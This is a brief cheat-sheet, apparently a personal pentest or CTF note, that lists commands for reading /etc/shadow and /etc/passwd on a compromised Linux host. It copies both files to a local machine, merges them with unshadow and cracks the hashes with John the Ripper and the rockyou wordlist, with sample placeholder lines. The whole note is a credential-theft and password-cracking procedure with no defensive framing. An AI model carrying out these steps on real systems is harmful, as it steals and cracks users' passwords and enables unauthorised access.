```bash
Cat /etc/*-release

After login
Cat /etc/shadow
Copy
Go to local machine
Vim shadow.txt
Paste
:wq
To save
Same do for /etc/passwd ->passwd.txt
Unshadow passwd.txt shadow.txt > hashes.txt -> it will merge two files as below
John --wordlist=/usr//rockyou hashes.txt


Passwd.txt -> raj:x:1000:1000:Raj:/home/raj:/bin/bash
Shadow.txt -> raj:$6$abc123$hashedpasswordhere:...
Unashado-> raj:$6$abc123$hashedpasswordhere:1000:1000:Raj:/home/raj:/bin/bash
```
